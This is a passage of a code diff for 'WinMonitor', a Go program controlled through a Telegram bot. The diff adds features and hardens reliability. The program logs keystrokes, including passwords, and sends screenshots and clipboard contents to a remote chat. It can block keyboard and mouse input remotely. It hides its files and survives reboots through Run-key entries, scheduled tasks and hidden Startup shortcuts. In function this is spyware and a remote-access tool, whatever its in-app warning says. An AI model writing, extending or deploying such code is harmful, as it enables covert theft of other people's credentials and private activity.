@@ -2,6 +2,8 @@ package main
 
 import (
 	"bytes"
+	"crypto/rand"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -9,30 +11,37 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/signal"
 	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 )
 
 const appName = "WinMonitor"
-const appVer = "1.0.0"
+const appVer = "1.1.0"
+
+// maxBlockMinutes: van an toan cung — du config=0, ban phim/chuot van tu mo sau N phut.
+const maxBlockMinutes = 30
+
+// maxPhotoBytes: > nguong nay thi gui dang document (sendPhoto gioi han 10MB).
+const maxPhotoBytes = 9 * 1024 * 1024
 
 var (
-	appData     = getEnv("APPDATA", homeDir())
-	baseDir     = filepath.Join(appData, appName)
-	configPath  = filepath.Join(baseDir, "config.json")
-	logPath     = filepath.Join(baseDir, "monitor.log")
-	selfCopy    = filepath.Join(baseDir, ".win_monitor.pyw")
-	deployExe   = filepath.Join(baseDir, "WinMonitor.exe")
-	launcher    = filepath.Join(baseDir, "WinMonitor.lnk")
-	startupDir  = filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-	startupCopy = filepath.Join(startupDir, ".win_monitor.pyw")
-	startupLnk  = filepath.Join(startupDir, "WinMonitor.lnk")
-	startTime   = time.Now()
-	isFrozen    = false // bản native: luôn là "exe"
-	httpClient  = &http.Client{Timeout: 45 * time.Second}
+	appData    = getEnv("APPDATA", homeDir())
+	baseDir    = filepath.Join(appData, appName)
+	configPath = filepath.Join(baseDir, "config.json")
+	logPath    = filepath.Join(baseDir, "monitor.log")
+	deployExe  = filepath.Join(baseDir, "WinMonitor.exe")
+	launcher   = filepath.Join(baseDir, "WinMonitor.lnk")
+	startupDir = filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+	startupLnk = filepath.Join(startupDir, "WinMonitor.lnk")
+	startTime  = time.Now()
+	httpClient = &http.Client{Timeout: 45 * time.Second}
+	stopMain   = make(chan struct{})
+	exitOnce   sync.Once
 )
 
 // ---- Config ----
@@ -48,6 +57,7 @@ type Config struct {
 	KeylogFlush        int    `json:"keylog_flush"`
 	BlockSafetyMinutes int    `json:"block_safety_minutes"`
 	HeartbeatInterval  int    `json:"heartbeat_interval"`
+	AllowAutoBind      bool   `json:"allow_autobind"`
 }
 
 func defaultConfig() Config {
@@ -63,6 +73,31 @@ func defaultConfig() Config {
 		KeylogFlush:        60,
 		BlockSafetyMinutes: 0,
 		HeartbeatInterval:  3600,
+		AllowAutoBind:      true,
+	}
+}
+
+// Validate chuan hoa/clampp gia tri (issue #8/#10).
+func (c *Config) Validate() {
+	clamp := func(v, lo, hi int) int {
+		if v < lo {
+			return lo
+		}
+		if v > hi {
+			return hi
+		}
+		return v
+	}
+	c.ScreenshotInterval = clamp(c.ScreenshotInterval, 5, 86400)
+	c.KeylogFlush = clamp(c.KeylogFlush, 10, 3600)
+	if c.HeartbeatInterval != 0 {
+		c.HeartbeatInterval = clamp(c.HeartbeatInterval, 60, 86400)
+	}
+	if c.BlockSafetyMinutes < 0 {
+		c.BlockSafetyMinutes = 0
+	}
+	if c.BlockSafetyMinutes > 1440 {
+		c.BlockSafetyMinutes = 1440
 	}
 }
 
@@ -83,50 +118,41 @@ func homeDir() string {
 	return h
 }
 
+// applyConfigData unmarshal đè lên base (trường thiếu giữ nguyên base) rồi Validate.
+func applyConfigData(base Config, data []byte) (Config, bool) {
+	var c Config = base
+	if err := json.Unmarshal(data, &c); err != nil {
+		return base, false
+	}
+	c.Validate()
+	return c, true
+}
+
 func loadConfig() {
 	cfg = defaultConfig()
-	source := ""
 	if fileExists(configPath) {
-		source = configPath
+		if data, err := os.ReadFile(configPath); err == nil {
+			if c, ok := applyConfigData(cfg, data); ok {
+				cfg = c
+			}
+		}
 	} else {
 		bs := bootstrapConfigPath()
 		if fileExists(bs) {
-			source = bs
-		}
-	}
-	if source != "" {
-		if data, err := os.ReadFile(source); err == nil {
-			var c Config
-			if json.Unmarshal(data, &c) == nil {
-				mergeConfig(&c)
+			if data, err := os.ReadFile(bs); err == nil {
+				if c, ok := applyConfigData(cfg, data); ok {
+					cfg = c
+					logMsg("Đã nạp cấu hình đóng gói từ " + bs)
+				}
+			}
+			// Dọn bản config công khai cạnh .exe sau khi đã nhập vào %APPDATA% (issue #4)
+			saveConfig()
+			if err := os.Remove(bs); err == nil {
+				logMsg("Đã xóa file config công khai cạnh .exe sau khi nhập.")
 			}
 		}
 	}
 	saveConfig()
-}
-
-func mergeConfig(c *Config) {
-	if c.BotToken != "" {
-		cfg.BotToken = c.BotToken
-	}
-	if c.ChatID != "" {
-		cfg.ChatID = c.ChatID
-	}
-	if c.ScreenshotInterval > 0 {
-		cfg.ScreenshotInterval = c.ScreenshotInterval
-	}
-	cfg.ScreenshotsEnabled = c.ScreenshotsEnabled
-	cfg.ActivityMonitor = c.ActivityMonitor
-	cfg.ProcessMonitor = c.ProcessMonitor
-	cfg.ClipboardMonitor = c.ClipboardMonitor
-	cfg.Keylogger = c.Keylogger
-	if c.KeylogFlush > 0 {
-		cfg.KeylogFlush = c.KeylogFlush
-	}
-	if c.HeartbeatInterval > 0 {
-		cfg.HeartbeatInterval = c.HeartbeatInterval
-	}
-	cfg.BlockSafetyMinutes = c.BlockSafetyMinutes
 }
 
 func saveConfig() {
@@ -135,8 +161,10 @@ func saveConfig() {
 	data, _ := json.MarshalIndent(cfg, "", "  ")
 	cfgMu.RUnlock()
 	tmp := configPath + ".tmp"
-	if os.WriteFile(tmp, data, 0o644) == nil {
+	if os.WriteFile(tmp, data, 0o600) == nil {
 		os.Rename(tmp, configPath)
+		hideFile(configPath)
+		restrictToCurrentUser(configPath)
 	}
 }
 
@@ -149,6 +177,7 @@ func cfgGet() Config {
 func cfgUpdate(fn func(*Config)) {
 	cfgMu.Lock()
 	fn(&cfg)
+	cfg.Validate()
 	cfgMu.Unlock()
 	saveConfig()
 }
@@ -229,6 +258,22 @@ func tgCall(method string, params map[string]string, filePath, fileField string)
 	return out
 }
 
+// retryAfterOf đọc retry_after từ lỗi 429 (issue #19/#27).
+func retryAfterOf(res map[string]interface{}) int {
+	if p, ok := res["parameters"].(map[string]interface{}); ok {
+		if ra, ok := p["retry_after"].(float64); ok {
+			return int(ra)
+		}
+	}
+	return 0
+}
+
+func isNetworkError(res map[string]interface{}) bool {
+	_, hasErr := res["error"]
+	_, hasCode := res["error_code"]
+	return hasErr && !hasCode
+}
+
 func htmlEscape(s string) string {
 	s = strings.ReplaceAll(s, "&", "&amp;")
 	s = strings.ReplaceAll(s, "<", "&lt;")
@@ -241,15 +286,80 @@ func hasChat() bool {
 	return c != "" && !strings.Contains(c, "PUT_YOUR")
 }
 
-// ---- Send queue ----
+// ---- Send queue (bounded, drop-oldest khi day - issue #12) ----
 type sendItem struct {
-	kind    string // "text" | "photo"
+	kind    string // "text" | "photo" | "doc"
 	text    string
 	path    string
 	caption string
+	markup  string // reply_markup JSON (tùy chọn)
 }
 
-var sendQ = make(chan sendItem, 1000)
+type sendQueue struct {
+	mu     sync.Mutex
+	cond   *sync.Cond
+	items  []sendItem
+	max    int
+	closed bool
+}
+
+func newSendQueue(max int) *sendQueue {
+	q := &sendQueue{max: max}
+	q.cond = sync.NewCond(&q.mu)
+	return q
+}
+
+func (q *sendQueue) push(it sendItem) {
+	q.mu.Lock()
+	defer q.mu.Unlock()
+	if q.closed {
+		return
+	}
+	if len(q.items) >= q.max {
+		// Bỏ item cũ nhất; nếu là ảnh/doc thì xóa file tạm
+		old := q.items[0]
+		if old.kind != "text" && old.path != "" {
+			os.Remove(old.path)
+		}
+		q.items = q.items[1:]
+	}
+	q.items = append(q.items, it)
+	q.cond.Signal()
+}
+
+func (q *sendQueue) pop() (sendItem, bool) {
+	q.mu.Lock()
+	defer q.mu.Unlock()
+	for len(q.items) == 0 && !q.closed {
+		q.cond.Wait()
+	}
+	if len(q.items) == 0 {
+		return sendItem{}, false
+	}
+	it := q.items[0]
+	q.items = q.items[1:]
+	return it, true
+}
+
+func (q *sendQueue) tryPop() (sendItem, bool) {
+	q.mu.Lock()
+	defer q.mu.Unlock()
+	if len(q.items) == 0 {
+		return sendItem{}, false
+	}
+	it := q.items[0]
+	q.items = q.items[1:]
+	return it, true
+}
+
+func (q *sendQueue) len() int {
+	q.mu.Lock()
+	defer q.mu.Unlock()
+	return len(q.items)
+}
+
+var sendQ = newSendQueue(300)
+
 var running = true
 var runMu sync.Mutex
 
@@ -269,25 +379,82 @@ func notify(text string) {
 	if !hasChat() {
 		return
 	}
-	select {
-	case sendQ <- sendItem{kind: "text", text: text}:
-	default:
+	sendQ.push(sendItem{kind: "text", text: text})
+}
+
+func notifyMarkup(text, markup string) {
+	if !hasChat() {
+		return
 	}
+	sendQ.push(sendItem{kind: "text", text: text, markup: markup})
 }
 
 func notifyPhoto(path, caption string) {
 	if !hasChat() {
 		return
 	}
-	select {
-	case sendQ <- sendItem{kind: "photo", path: path, caption: caption}:
-	default:
+	sendQ.push(sendItem{kind: "photo", path: path, caption: caption})
+}
+
+// deliver gửi 1 item, tự xử lý 429 + lỗi mạng. Trả về ok.
+func deliver(item sendItem, chat string) bool {
+	if item.kind == "text" {
+		t := item.text
+		if len(t) > 4000 {
+			t = t[:4000]
+		}
+		params := map[string]string{
+			"chat_id": chat, "text": t, "parse_mode": "HTML",
+			"disable_web_page_preview": "true",
+		}
+		if item.markup != "" {
+			params["reply_markup"] = item.markup
+		}
+		res := tgCall("sendMessage", params, "", "")
+		return handleSendResult(res)
 	}
+	if !fileExists(item.path) {
+		return true
+	}
+	cap := item.caption
+	if len(cap) > 1000 {
+		cap = cap[:1000]
+	}
+	st, _ := os.Stat(item.path)
+	if st != nil && st.Size() > maxPhotoBytes {
+		// Ảnh quá lớn -> gửi dạng document (issue #16)
+		res := tgCall("sendDocument", map[string]string{
+			"chat_id": chat, "caption": cap, "parse_mode": "HTML",
+		}, item.path, "document")
+		os.Remove(item.path)
+		return handleSendResult(res)
+	}
+	res := tgCall("sendPhoto", map[string]string{
+		"chat_id": chat, "caption": cap, "parse_mode": "HTML",
+	}, item.path, "photo")
+	os.Remove(item.path)
+	return handleSendResult(res)
+}
+
+// handleSendResult trả về false nếu cần retry (lỗi mạng / 429 đã ngủ).
+func handleSendResult(res map[string]interface{}) bool {
+	if ok, _ := res["ok"].(bool); ok {
+		return true
+	}
+	if ra := retryAfterOf(res); ra > 0 {
+		time.Sleep(time.Duration(ra) * time.Second)
+		return false
+	}
+	if isNetworkError(res) {
+		return false
+	}
+	return true // lỗi API khác (vd chat sai) -> bỏ, không retry vô hạn
 }
 
 func senderLoop() {
+	backoff := time.Second
 	for isRunning() {
-		item, ok := <-sendQ
+		item, ok := sendQ.pop()
 		if !ok {
 			return
 		}
@@ -295,34 +462,27 @@ func senderLoop() {
 		if chat == "" {
 			continue
 		}
-		if item.kind == "text" {
-			t := item.text
-			if len(t) > 4000 {
-				t = t[:4000]
+		okSent := deliver(item, chat)
+		if !okSent {
+			// lỗi mạng: backoff + đẩy lại để thử tiếp (không mất tin quan trọng)
+			time.Sleep(backoff)
+			if backoff < 60*time.Second {
+				backoff *= 2
 			}
-			tgCall("sendMessage", map[string]string{
-				"chat_id": chat, "text": t, "parse_mode": "HTML",
-				"disable_web_page_preview": "true",
-			}, "", "")
-		} else {
-			if !fileExists(item.path) {
-				continue
-			}
-			cap := item.caption
-			if len(cap) > 1000 {
-				cap = cap[:1000]
-			}
-			tgCall("sendPhoto", map[string]string{
-				"chat_id": chat, "caption": cap, "parse_mode": "HTML",
-			}, item.path, "photo")
-			os.Remove(item.path)
+			sendQ.push(item)
+			continue
 		}
+		backoff = time.Second
 		time.Sleep(1050 * time.Millisecond)
 	}
 }
 
 // ---- Screenshot loop ----
 func doScreenshotSend(prefix string) {
+	if sendQ.len() > 240 {
+		logMsg("Bỏ qua chụp: hàng đợi gửi đang đầy (có thể mất mạng).")
+		return
+	}
 	path := filepath.Join(baseDir, "shot_"+time.Now().Format("20060102_150405")+".png")
 	if takeScreenshot(path) {
 		notifyPhoto(path, fmt.Sprintf("%s <b>Chụp màn hình</b>\n🕒 %s", prefix, time.Now().Format("15:04:05 02/01/2006")))
@@ -383,10 +543,15 @@ func processMonitor() {
 				cur[p.PID+"|"+p.Name] = true
 			}
 			if prev != nil {
+				count := 0
 				for _, p := range procs {
 					key := p.PID + "|" + p.Name
 					if !prev[key] && !ignoreProc[strings.ToLower(p.Name)] {
 						notify(fmt.Sprintf("🚀 <b>Tiến trình mới:</b> %s <code>(PID %s)</code>", htmlEscape(p.Name), p.PID))
+						count++
+						if count >= 15 {
+							break // tránh spam khi cài phần mềm hàng loạt (issue #19)
+						}
 					}
 				}
 			}
@@ -474,37 +639,69 @@ func vkToText(vk int, shift bool) string {
 	return ""
 }
 
+var (
+	keyBufMu sync.Mutex
+	keyBuf   strings.Builder
+	hookOK   bool
+)
+
+func keySink(t string) {
+	if !cfgGet().Keylogger {
+		return
+	}
+	keyBufMu.Lock()
+	keyBuf.WriteString(t)
+	keyBufMu.Unlock()
+}
+
+func keyBufLen() int {
+	keyBufMu.Lock()
+	defer keyBufMu.Unlock()
+	return keyBuf.Len()
+}
+
+func keyBufTake() string {
+	keyBufMu.Lock()
+	defer keyBufMu.Unlock()
+	s := keyBuf.String()
+	keyBuf.Reset()
+	return s
+}
+
 func keyloggerLoop() {
 	pressed := map[int]bool{}
-	var buf strings.Builder
 	lastFlush := time.Now()
 	for isRunning() {
 		c := cfgGet()
 		if !c.Keylogger {
 			pressed = map[int]bool{}
-			buf.Reset()
+			keyBufTake() // xóa buffer khi tắt
 			time.Sleep(500 * time.Millisecond)
 			continue
 		}
-		shift := keyDown(0x10)
-		for vk := 8; vk < 256; vk++ {
-			down := keyDown(vk)
-			if down && !pressed[vk] {
-				pressed[vk] = true
-				if t := vkToText(vk, shift); t != "" {
-					buf.WriteString(t)
+		// Nếu không cài được hook -> dùng polling dự phòng (issue #15)
+		if !hookOK {
+			shift := keyDown(0x10)
+			for vk := 8; vk < 256; vk++ {
+				down := keyDown(vk)
+				if down && !pressed[vk] {
+					pressed[vk] = true
+					if t := vkToText(vk, shift); t != "" {
+						keyBufMu.Lock()
+						keyBuf.WriteString(t)
+						keyBufMu.Unlock()
+					}
+				} else if !down && pressed[vk] {
+					delete(pressed, vk)
 				}
-			} else if !down && pressed[vk] {
-				delete(pressed, vk)
 			}
 		}
 		flush := c.KeylogFlush
 		if flush < 10 {
 			flush = 10
 		}
-		if buf.Len() > 0 && time.Since(lastFlush) >= time.Duration(flush)*time.Second {
-			text := buf.String()
-			buf.Reset()
+		if keyBufLen() > 0 && time.Since(lastFlush) >= time.Duration(flush)*time.Second {
+			text := keyBufTake()
 			lastFlush = time.Now()
 			if strings.TrimSpace(text) != "" {
 				if len(text) > 3000 {
@@ -518,9 +715,7 @@ func keyloggerLoop() {
 }
 
 // ---- Persistence ----
-func launcherTarget() string {
-	return deployExe
-}
+func launcherTarget() string { return deployExe }
 
 func deploySrc() string {
 	exe, _ := os.Executable()
@@ -529,16 +724,20 @@ func deploySrc() string {
 
 func registerScheduledTasks() {
 	tr := `"` + launcherTarget() + `"`
-	runHidden("schtasks", "/Create", "/TN", "WinMonitorGuard", "/TR", tr, "/SC", "MINUTE", "/MO", "1", "/F")
-	runHidden("schtasks", "/Create", "/TN", "WinMonitorLogon", "/TR", tr, "/SC", "ONLOGON", "/F")
+	if err := runHidden("schtasks", "/Create", "/TN", "WinMonitorGuard", "/TR", tr, "/SC", "MINUTE", "/MO", "5", "/F"); err != nil {
+		logMsg("schtasks Guard lỗi: " + err.Error())
+	}
+	if err := runHidden("schtasks", "/Create", "/TN", "WinMonitorLogon", "/TR", tr, "/SC", "ONLOGON", "/F"); err != nil {
+		logMsg("schtasks Logon lỗi: " + err.Error())
+	}
 }
 
 func registerRunKey() {
-	exe, _ := os.Executable()
-	_ = exe
 	val := `"` + launcherTarget() + `"`
-	runHidden("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
-		"/v", "WinMonitor", "/t", "REG_SZ", "/d", val, "/f")
+	if err := runHidden("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
+		"/v", "WinMonitor", "/t", "REG_SZ", "/d", val, "/f"); err != nil {
+		logMsg("reg add Run lỗi: " + err.Error())
+	}
 }
 
 func copyHidden(src, dst string) bool {
@@ -574,11 +773,15 @@ func ensurePersistence() {
 		hideFile(deployExe)
 	}
 	if !fileExists(launcher) {
-		createShortcut(launcher, deployExe, "", filepath.Dir(deployExe))
+		if !createShortcut(launcher, deployExe, "", filepath.Dir(deployExe)) {
+			logMsg("Tạo shortcut launcher thất bại (có thể bị chặn PowerShell).")
+		}
 	}
 	hideFile(launcher)
 	os.MkdirAll(startupDir, 0o755)
-	createShortcut(startupLnk, deployExe, "", filepath.Dir(deployExe))
+	if !createShortcut(startupLnk, deployExe, "", filepath.Dir(deployExe)) {
+		logMsg("Tạo shortcut Startup thất bại (có thể bị chặn PowerShell).")
+	}
 	hideFile(startupLnk)
 	registerRunKey()
 	registerScheduledTasks()
@@ -589,6 +792,25 @@ func selfhealLoop() {
 		time.Sleep(300 * time.Second)
 		if isRunning() {
 			ensurePersistence()
+			cleanupOldShots(2 * time.Hour)
+		}
+	}
+}
+
+func cleanupOldShots(maxAge time.Duration) {
+	entries, err := os.ReadDir(baseDir)
+	if err != nil {
+		return
+	}
+	now := time.Now()
+	for _, e := range entries {
+		name := e.Name()
+		if strings.HasPrefix(name, "shot_") && strings.HasSuffix(name, ".png") {
+			if info, err := e.Info(); err == nil {
+				if now.Sub(info.ModTime()) > maxAge {
+					os.Remove(filepath.Join(baseDir, name))
+				}
+			}
 		}
 	}
 }
@@ -600,7 +822,7 @@ func removePersistence() {
 	runHidden("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
 		"/v", "WinMonitor", "/f")
 	self, _ := os.Executable()
-	for _, p := range []string{startupCopy, selfCopy, deployExe, launcher, startupLnk} {
+	for _, p := range []string{deployExe, launcher, startupLnk} {
 		if filepath.Clean(p) != filepath.Clean(self) {
 			os.Remove(p)
 		}
@@ -615,16 +837,34 @@ type pendingOtp struct {
 }
 
 var (
-	pendingMu sync.Mutex
-	pending   = map[string]pendingOtp{}
+	pendingMu   sync.Mutex
+	pending     = map[string]pendingOtp{}
+	otpFailures int
 )
 
+// genOtp sinh mã 6 chữ số bằng CSPRNG (issue #5/#26).
+func genOtp() string {
+	var b [4]byte
+	rand.Read(b[:])
+	n := binary.BigEndian.Uint32(b[:]) % 1000000
+	return fmt.Sprintf("%06d", n)
+}
+
 func requestOtp(action, label string) {
-	code := fmt.Sprintf("%06d", time.Now().UnixNano()%1000000)
+	code := genOtp()
 	pendingMu.Lock()
 	pending[action] = pendingOtp{code: code, expires: time.Now().Add(120 * time.Second)}
+	otpFailures = 0
 	pendingMu.Unlock()
 	notify(fmt.Sprintf("🔐 <b>XÁC NHẬN %s</b>\nMã dùng 1 lần: <code>%s</code>\nGửi <code>/confirm %s</code> trong vòng 120 giây.\nGửi /cancel để hủy.", label, code, code))
+}
+
+// requestExit thoát êm: giải phóng BlockInput rồi dừng (issue #29).
+func requestExit() {
+	exitOnce.Do(func() {
+		setRunning(false)
+		close(stopMain)
+	})
 }
 
 func executeAction(action string) {
@@ -641,9 +881,7 @@ func executeAction(action string) {
 		notify("🛑 Đã xác thực. Đang DỪNG GIÁM SÁT và gỡ khỏi khởi động cùng Windows...")
 		removePersistence()
 		time.Sleep(1500 * time.Millisecond)
-		setRunning(false)
-		time.Sleep(500 * time.Millisecond)
-		os.Exit(0)
+		requestExit()
 	}
 }
 
@@ -668,7 +906,10 @@ var botCommands = [][2]string{
 	{"confirm", "Xác nhận mã OTP"},
 	{"cancel", "Hủy yêu cầu đang chờ"},
 	{"config", "Xem cấu hình"},
+	{"get", "Xem 1 khóa cấu hình"},
 	{"set", "Đổi cấu hình: /set khóa giá_trị"},
+	{"reset", "Đặt lại cấu hình mặc định"},
+	{"reload_config", "Nạp lại config từ file"},
 	{"logs", "Xem log gần đây"},
 	{"reload", "Cập nhật lại menu lệnh"},
 }
@@ -716,11 +957,19 @@ func helpText() string {
 		"/stop - Dừng giám sát\n" +
 		"/confirm &lt;mã&gt; - Xác nhận OTP\n" +
 		"/cancel - Hủy yêu cầu\n\n" +
-		"<b>Khác</b>\n" +
-		"/config - Xem cấu hình\n" +
-		"/set &lt;khóa&gt; &lt;giá trị&gt; - Đổi cấu hình\n" +
-		"/logs [n] - Xem log gần đây\n" +
-		"/reload - Cập nhật lại menu lệnh"
+		"<b>Cấu hình</b>\n" +
+		"/config - Xem toàn bộ\n" +
+		"/get &lt;khóa&gt; - Xem 1 khóa\n" +
+		"/set &lt;khóa&gt; &lt;giá trị&gt; - Đổi\n" +
+		"/reset - Về mặc định\n" +
+		"/reload_config - Nạp lại từ file\n" +
+		"/logs [n] - Xem log\n" +
+		"/reload - Cập nhật menu lệnh"
+}
+
+// mainKeyboard là inline keyboard các lệnh hay dùng (issue #38).
+func mainKeyboard() string {
+	return `{"inline_keyboard":[[{"text":"📸 Chụp","callback_data":"/shot"},{"text":"📊 Trạng thái","callback_data":"/status"}],[{"text":"🔒 Khóa","callback_data":"/lock"},{"text":"⌨️ Keylog on","callback_data":"/keylog on"}],[{"text":"🛑 Block","callback_data":"/block"},{"text":"🔓 Unblock","callback_data":"/unblock"}]]}`
 }
 
 func parseBool(v string) bool {
@@ -741,7 +990,9 @@ func handleCommand(text, chatID string) {
 	args := fields[1:]
 
 	switch cmd {
-	case "/start", "/help":
+	case "/start":
+		notifyMarkup(helpText(), mainKeyboard())
+	case "/help":
 		notify(helpText())
 	case "/reload":
 		notify("🔄 Đang cập nhật lại menu lệnh...")
@@ -753,25 +1004,26 @@ func handleCommand(text, chatID string) {
 		if isInputBlocked() {
 			blocked = "ĐANG NGẮT"
 		}
-		notify(fmt.Sprintf("📊 <b>TRẠNG THÁI</b>\n⏱ Uptime: %dh %dm %ds\n📸 Chụp: %s | mỗi %ds\n🪟 Cửa sổ: %s\n🚀 Tiến trình: %s\n📋 Clipboard: %s\n⌨️ Keylog: %s\n🔒 Bàn phím/chuột: %s\n💓 Heartbeat: %ds",
+		elev := "Không (chạy thường)"
+		if isElevated() {
+			elev = "Có (Admin)"
+		}
+		notify(fmt.Sprintf("📊 <b>TRẠNG THÁI</b>\n⏱ Uptime: %dh %dm %ds\n📸 Chụp: %s | mỗi %ds\n🪟 Cửa sổ: %s\n🚀 Tiến trình: %s\n📋 Clipboard: %s\n⌨️ Keylog: %s\n🔒 Bàn phím/chuột: %s\n🛡 Quyền: %s\n💓 Heartbeat: %ds",
 			up/3600, (up%3600)/60, up%60,
 			onoff(c.ScreenshotsEnabled), c.ScreenshotInterval,
 			onoff(c.ActivityMonitor), onoff(c.ProcessMonitor), onoff(c.ClipboardMonitor),
-			onoff(c.Keylogger), blocked, c.HeartbeatInterval))
+			onoff(c.Keylogger), blocked, elev, c.HeartbeatInterval))
 	case "/shot":
-		notify("📸 Đang chụp...")
+		notify("⏳ Đang chụp...")
 		go doScreenshotSend("📸")
 	case "/interval":
 		if len(args) == 0 || !isDigits(args[0]) {
-			notify("Cú pháp: /interval <giây> (tối thiểu 5)")
+			notify("Cú pháp: /interval <giây> (5–86400)")
 			return
 		}
 		v, _ := strconv.Atoi(args[0])
-		if v < 5 {
-			v = 5
-		}
 		cfgUpdate(func(c *Config) { c.ScreenshotInterval = v })
-		notify(fmt.Sprintf("✅ Đã đổi chu kỳ chụp thành %d giây.", v))
+		notify(fmt.Sprintf("✅ Đã đổi chu kỳ chụp thành %d giây.", cfgGet().ScreenshotInterval))
 	case "/screen", "/activity", "/process", "/clip", "/keylog":
 		if len(args) == 0 {
 			notify("Cú pháp: " + cmd + " on|off")
@@ -792,6 +1044,9 @@ func handleCommand(text, chatID string) {
 				c.Keylogger = b
 			}
 		})
+		if cmd == "/keylog" && b {
+			notify("⚠️ Đã BẬT keylogger — công cụ này ghi lại MỌI phím gõ (kể cả mật khẩu). Chỉ dùng trên máy của chính bạn và khi thật cần. Gõ /keylog off để tắt.")
+		}
 		notify(fmt.Sprintf("✅ %s = %s", cmd, onoff(b)))
 	case "/block":
 		auto := 0
@@ -800,6 +1055,10 @@ func handleCommand(text, chatID string) {
 		}
 		if auto == 0 {
 			auto = cfgGet().BlockSafetyMinutes
+		}
+		// Van an toan cung: luôn có thời hạn tự mở (issue #11/#14)
+		if auto <= 0 || auto > maxBlockMinutes {
+			auto = maxBlockMinutes
 		}
 		if isInputBlocked() {
 			notify("ℹ️ Bàn phím/chuột đang bị ngắt rồi.")
@@ -811,11 +1070,7 @@ func handleCommand(text, chatID string) {
 				notify("⚠️ Không ngắt được bàn phím/chuột (có thể cần quyền Admin).")
 				return
 			}
-			extra := " Gửi /unblock để mở lại."
-			if auto > 0 {
-				extra = fmt.Sprintf(" Tự mở khóa sau %d phút.", auto)
-			}
-			notify("🔒 Đã NGẮT bàn phím & chuột." + extra)
+			notify(fmt.Sprintf("🔒 Đã NGẮT bàn phím & chuột. Tự mở khóa sau %d phút (van an toàn) hoặc gửi /unblock.", auto))
 		}()
 	case "/unblock":
 		if StopBlock() {
@@ -849,16 +1104,28 @@ func handleCommand(text, chatID string) {
 			}
 			if info.code == code {
 				delete(pending, action)
+				otpFailures = 0
 				pendingMu.Unlock()
 				executeAction(action)
 				return
 			}
 		}
+		otpFailures++
+		exceeded := otpFailures >= 5
+		if exceeded {
+			pending = map[string]pendingOtp{}
+			otpFailures = 0
+		}
 		pendingMu.Unlock()
-		notify("❌ Mã không đúng hoặc đã hết hạn.")
+		if exceeded {
+			notify("❌ Sai mã quá 5 lần — đã hủy toàn bộ yêu cầu. Hãy tạo lại.")
+		} else {
+			notify(fmt.Sprintf("❌ Mã không đúng hoặc đã hết hạn (còn %d lần thử).", 5-otpFailures))
+		}
 	case "/cancel":
 		pendingMu.Lock()
 		pending = map[string]pendingOtp{}
+		otpFailures = 0
 		pendingMu.Unlock()
 		notify("✅ Đã hủy mọi yêu cầu đang chờ.")
 	case "/config":
@@ -866,6 +1133,16 @@ func handleCommand(text, chatID string) {
 		c.BotToken = maskToken(c.BotToken)
 		data, _ := json.MarshalIndent(c, "", "  ")
 		notify("<b>CẤU HÌNH</b>\n<code>" + htmlEscape(string(data)) + "</code>")
+	case "/get":
+		if len(args) == 0 {
+			notify("Cú pháp: /get <khóa>")
+			return
+		}
+		if v, ok := getConfigValue(args[0]); ok {
+			notify(fmt.Sprintf("<b>%s</b> = <code>%s</code>", args[0], htmlEscape(v)))
+		} else {
+			notify("❌ Khóa không hợp lệ.")
+		}
 	case "/set":
 		if len(args) < 2 {
 			notify("Cú pháp: /set <khóa> <giá trị>")
@@ -873,11 +1150,24 @@ func handleCommand(text, chatID string) {
 		}
 		key := args[0]
 		val := strings.Join(args[1:], " ")
-		if !applySet(key, val) {
-			notify("❌ Khóa/giá trị không hợp lệ. Khóa: screenshot_interval, screenshots_enabled, activity_monitor, process_monitor, clipboard_monitor, keylogger, keylog_flush, block_safety_minutes, heartbeat_interval")
+		if err := applySet(key, val); err != "" {
+			notify("❌ " + err)
 			return
 		}
 		notify(fmt.Sprintf("✅ %s = %s", key, val))
+	case "/reset":
+		old := cfgGet()
+		cfg = defaultConfig()
+		cfg.BotToken = old.BotToken
+		cfg.ChatID = old.ChatID
+		cfgMu.Lock()
+		cfg.Validate()
+		cfgMu.Unlock()
+		saveConfig()
+		notify("✅ Đã đặt lại cấu hình về mặc định (giữ nguyên token/chat_id).")
+	case "/reload_config":
+		loadConfig()
+		notify("✅ Đã nạp lại cấu hình từ file.")
 	case "/logs":
 		n := 30
 		if len(args) > 0 && isDigits(args[0]) {
@@ -905,46 +1195,75 @@ func handleCommand(text, chatID string) {
 	}
 }
 
-func applySet(key, val string) bool {
+func getConfigValue(key string) (string, bool) {
+	c := cfgGet()
+	switch key {
+	case "bot_token":
+		return maskToken(c.BotToken), true
+	case "chat_id":
+		return c.ChatID, true
+	case "screenshot_interval":
+		return strconv.Itoa(c.ScreenshotInterval), true
+	case "screenshots_enabled":
+		return strconv.FormatBool(c.ScreenshotsEnabled), true
+	case "activity_monitor":
+		return strconv.FormatBool(c.ActivityMonitor), true
+	case "process_monitor":
+		return strconv.FormatBool(c.ProcessMonitor), true
+	case "clipboard_monitor":
+		return strconv.FormatBool(c.ClipboardMonitor), true
+	case "keylogger":
+		return strconv.FormatBool(c.Keylogger), true
+	case "keylog_flush":
+		return strconv.Itoa(c.KeylogFlush), true
+	case "block_safety_minutes":
+		return strconv.Itoa(c.BlockSafetyMinutes), true
+	case "heartbeat_interval":
+		return strconv.Itoa(c.HeartbeatInterval), true
+	case "allow_autobind":
+		return strconv.FormatBool(c.AllowAutoBind), true
+	}
+	return "", false
+}
+
+func applySet(key, val string) string {
+	setInt := func(apply func(c *Config, v int)) string {
+		v, err := strconv.Atoi(val)
+		if err != nil {
+			return "Giá trị phải là số nguyên."
+		}
+		cfgUpdate(func(c *Config) { apply(c, v) })
+		return ""
+	}
+	setBool := func(apply func(c *Config, b bool)) {
+		b := parseBool(val)
+		cfgUpdate(func(c *Config) { apply(c, b) })
+	}
 	switch key {
 	case "screenshot_interval":
-		v, err := strconv.Atoi(val)
-		if err != nil {
-			return false
-		}
-		cfgUpdate(func(c *Config) { c.ScreenshotInterval = v })
+		return setInt(func(c *Config, v int) { c.ScreenshotInterval = v })
 	case "screenshots_enabled":
-		cfgUpdate(func(c *Config) { c.ScreenshotsEnabled = parseBool(val) })
+		setBool(func(c *Config, b bool) { c.ScreenshotsEnabled = b })
